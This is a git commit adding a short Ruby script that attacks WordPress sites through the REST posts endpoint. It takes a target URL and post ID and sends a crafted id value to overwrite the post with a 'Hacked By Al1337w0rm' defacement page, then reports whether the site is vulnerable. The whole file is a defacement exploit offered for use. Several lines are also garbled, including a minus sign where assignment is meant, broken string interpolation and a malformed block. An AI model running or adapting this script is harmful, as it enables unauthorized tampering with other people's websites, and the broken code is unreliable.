9102274a33ec92a736b5d597d95c77dcb682f2d6
VP47 <64722004+VinhPham47@users.noreply.github.com>
2022-01-22 10:09:37 +0700

    Add files via upload

---
+++ a.rb
@@ -0,0 +1,22 @@
+#usage gem install rest-client
+require 'rest-client'
+require 'json'
+puts "Enter Target URI (With wp directory)"
+targeturi = gets.chomp
+puts "Enter Post ID"
+postid = gets.chomp.to_i
+response - RestClient.post(
+"#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",
+{
+  "id" => "#(postid)justrawdata",
+  "title" => "Hacked By Al1337w0rm",
+  "content" => "<center><hl>Hacked by Al1337w0rm !?</hl><br><pre>$ Nothing is impossible in the cyber world $</pre></center>"
+}.to_json,
+:content_type => :json,
+:accept => :json
+) {[response, request, result| response }
+if(response.code == 200)
+puts "Done!'#{targeturi}/index.php?p=#{postid}'"
+else
+puts "This site is not Vulnerable"
+end
